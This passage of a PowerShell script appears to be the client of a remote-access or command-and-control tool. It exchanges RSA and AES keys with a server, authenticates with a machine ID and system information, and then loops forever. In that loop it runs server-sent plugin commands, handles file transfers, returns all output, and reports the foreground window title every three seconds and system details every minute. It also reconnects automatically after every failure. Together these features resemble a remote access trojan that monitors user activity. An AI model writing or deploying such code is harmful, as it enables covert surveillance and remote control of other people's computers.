        if ($null -eq $serverRsaPubKey) {
            Write-Host "$(Get-Date -Format 'HH:mm:ss') - Failed to read RSA public key" -ForegroundColor Red
            throw "Key exchange failed"
        }
        Write-Host "$(Get-Date -Format 'HH:mm:ss') - Received server public key ($serverKeyLen bytes)" -ForegroundColor Gray

        # Generate random AES-256 key
        $aesKey = New-Object byte[] 32
        $rng = [System.Security.Cryptography.RandomNumberGenerator]::Create()
        $rng.GetBytes($aesKey)
        $rng.Dispose()

        # Encrypt AES key with server's RSA public key (PKCS#1 v1.5)
        $rsa = [System.Security.Cryptography.RSACryptoServiceProvider]::new()
        $rsa.ImportCspBlob($serverRsaPubKey)
        $encAesKey = $rsa.Encrypt($aesKey, $false)
        $rsa.Dispose()

        # Send encrypted AES key (4-byte LE length + encrypted key)
        $encKeyLenBuf = New-Object byte[] 4
        $encKeyLenBuf[0] = [byte]($encAesKey.Length -band 0xFF)
        $encKeyLenBuf[1] = [byte](($encAesKey.Length -shr 8) -band 0xFF)
        $encKeyLenBuf[2] = [byte](($encAesKey.Length -shr 16) -band 0xFF)
        $encKeyLenBuf[3] = [byte](($encAesKey.Length -shr 24) -band 0xFF)
        $stream.Write($encKeyLenBuf, 0, 4)
        $stream.Write($encAesKey, 0, $encAesKey.Length)
        $stream.Flush()

        $script:globalAesKey = $aesKey
        Write-Host "$(Get-Date -Format 'HH:mm:ss') - AES key exchange complete! Channel encrypted." -ForegroundColor Green

        # ========== AUTHENTICATION ==========
        $authJson = @{
            password   = $httpPassword
            machine_id = $machineId
            info       = $systemInfo
        } | ConvertTo-Json -Compress -Depth 5

        $authBytes = [Text.Encoding]::UTF8.GetBytes($authJson)
        Write-EncryptedMessage -Stream $stream -MsgType $MSG_AUTH -Payload $authBytes -AesKey $aesKey

        $authResp = Read-EncryptedMessage -Stream $stream -AesKey $aesKey
        if ($null -eq $authResp) {
            Write-Host "$(Get-Date -Format 'HH:mm:ss') - No auth response" -ForegroundColor Red
            throw "Auth failed"
        }

        if ($authResp.Type -eq $MSG_AUTH_FAIL) {
            $reason = if ($authResp.Payload) { [Text.Encoding]::UTF8.GetString($authResp.Payload) } else { "Unknown" }
            Write-Host "$(Get-Date -Format 'HH:mm:ss') - Auth failed: $reason" -ForegroundColor Red
            throw "Auth failed"
        }

        if ($authResp.Type -ne $MSG_AUTH_OK) {
            Write-Host "$(Get-Date -Format 'HH:mm:ss') - Unexpected response: 0x$($authResp.Type.ToString('X2'))" -ForegroundColor Red
            throw "Auth failed"
        }

        Write-Host "$(Get-Date -Format 'HH:mm:ss') - Authenticated!" -ForegroundColor Green

        # ========== MESSAGE LOOP ==========

        $lastHeartbeat = [DateTime]::UtcNow
        $lastInfoRefresh = [DateTime]::UtcNow
        $lastCleanup = [DateTime]::UtcNow
        $lastActiveWindow = [DateTime]::UtcNow
        $infoRefreshSeconds = 60
        $cleanupIntervalSeconds = 10
        $activeWindowSeconds = 3
        $originalReceiveTimeout = $tcpClient.ReceiveTimeout

        while ($tcpClient.Connected) {
            $now = [DateTime]::UtcNow

            # ---- Try to read a message with 200ms timeout ----
            $msg = $null
            try {
                $tcpClient.ReceiveTimeout = 200
                if ($stream.DataAvailable) {
                    $msg = Read-EncryptedMessage -Stream $stream -AesKey $aesKey
                }
            } catch {
                # timeout - continue to heartbeat/plugin checks
            }

            if ($null -eq $msg) {
                # If data was available but read failed, connection may be lost
                try {
                    if ($stream.DataAvailable) {
                        $msg = Read-EncryptedMessage -Stream $stream -AesKey $aesKey
                        if ($null -eq $msg) { throw "Connection lost" }
                    }
                } catch { throw "Connection lost" }
            }

            if ($msg) {
                switch ($msg.Type) {
                    $MSG_HEARTBEAT_ACK {
                        if ($msg.Payload -and $msg.Payload.Length -ge 5) {
                            $pending = [int]$msg.Payload[0] -bor ([int]$msg.Payload[1] -shl 8) -bor
                                       ([int]$msg.Payload[2] -shl 16) -bor ([int]$msg.Payload[3] -shl 24)
                            $fileQueued = $msg.Payload[4] -ne 0
                            if ($pending -gt 0 -or $fileQueued) {
                                Write-Host "$(Get-Date -Format 'HH:mm:ss') - Pending: $pending cmd(s), file=$fileQueued" -ForegroundColor Cyan
                            }
                        }
                    }
                    $MSG_PLUGIN_CMD { Handle-PluginCmd -Payload $msg.Payload }
                    $MSG_FILE_TRANSFER { Handle-FileTransfer -Payload $msg.Payload -AesKey $aesKey }
                    $MSG_DISCONNECT { throw "Server disconnect" }
                    default {
                        Write-Host "$(Get-Date -Format 'HH:mm:ss') - Unknown msg: 0x$($msg.Type.ToString('X2'))" -ForegroundColor Yellow
                    }
                }
                # Process more messages immediately
                continue
            }

            # ---- Drain any remaining buffered messages ----
            $drained = $false
            while (-not $drained) {
                $drained = $true
                while ($stream.DataAvailable) {
                    $msg = Read-EncryptedMessage -Stream $stream -AesKey $aesKey
                    if ($null -eq $msg) { throw "Connection lost" }
                    switch ($msg.Type) {
                        $MSG_HEARTBEAT_ACK { }
                        $MSG_PLUGIN_CMD { Handle-PluginCmd -Payload $msg.Payload }
                        $MSG_FILE_TRANSFER { Handle-FileTransfer -Payload $msg.Payload -AesKey $aesKey }
                        $MSG_DISCONNECT { throw "Server disconnect" }
                        default { }
                    }
                    $drained = $false
                }
            }

            # ---- Send ALL plugin output ----
            $outputDrained = $false
            while (-not $outputDrained) {
                $sentAny = Send-AllPluginOutput -Stream $stream -AesKey $aesKey
                if (-not $sentAny) { $outputDrained = $true }
                if ($stream.DataAvailable) { break }
            }

            if ($stream.DataAvailable) { continue }

            # ---- Heartbeat ----
            if (($now - $lastHeartbeat).TotalSeconds -ge $heartbeatInterval) {
                Write-EncryptedMessage -Stream $stream -MsgType $MSG_HEARTBEAT -Payload ([byte[]]@(0)) -AesKey $aesKey
                $lastHeartbeat = $now
            }

            # ---- Active window reporting ----
            if (($now - $lastActiveWindow).TotalSeconds -ge $activeWindowSeconds) {
                $lastActiveWindow = $now
                try {
                    $title = Get-ActiveWindowTitle
                    if (-not [string]::IsNullOrEmpty($title)) {
                        $titleBytes = [Text.Encoding]::UTF8.GetBytes($title)
                        Write-EncryptedMessage -Stream $stream -MsgType $MSG_ACTIVE_WINDOW -Payload $titleBytes -AesKey $aesKey
                    }
                } catch { }
            }

            # ---- System info refresh ----
            if (($now - $lastInfoRefresh).TotalSeconds -ge $infoRefreshSeconds) {
                $lastInfoRefresh = $now
                $systemInfo = Get-SystemInfo
                $infoBytes = [Text.Encoding]::UTF8.GetBytes($systemInfo)
                Write-EncryptedMessage -Stream $stream -MsgType $MSG_CLIENT_INFO -Payload $infoBytes -AesKey $aesKey
            }

            # ---- Dead plugin cleanup ----
            if (($now - $lastCleanup).TotalSeconds -ge $cleanupIntervalSeconds) {
                $lastCleanup = $now
                Cleanup-DeadPlugins
            }
        }
    }
    catch {
        $errMsg = $_.Exception.Message
        if ($errMsg -ne "Auth failed" -and $errMsg -ne "Connection lost" -and $errMsg -ne "Server disconnect" -and $errMsg -ne "Key exchange failed") {
            Write-Host "$(Get-Date -Format 'HH:mm:ss') - Error: $errMsg" -ForegroundColor Red
        }
    }
    finally {
        if ($null -ne $stream) { try { $stream.Dispose() } catch { } }
        if ($null -ne $tcpClient) { try { $tcpClient.Close() } catch { } }

        Write-Host "$(Get-Date -Format 'HH:mm:ss') - Reconnecting in 5s..." -ForegroundColor Yellow
        Start-Sleep -Seconds 5
    }
}
}
finally {
    Stop-AllPlugins
}
